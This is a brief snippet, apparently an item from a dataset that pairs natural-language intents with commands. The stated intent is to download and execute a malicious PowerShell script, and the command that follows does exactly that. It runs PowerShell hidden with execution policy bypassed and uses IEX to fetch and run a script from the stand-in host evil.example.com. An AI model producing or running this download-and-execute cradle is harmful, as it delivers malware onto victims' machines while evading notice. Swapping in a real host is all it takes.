# Natural language intent:
# Download and execute a malicious PowerShell script from a remote server.

powershell.exe -windowstyle hidden -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/heavy32.ps1')"
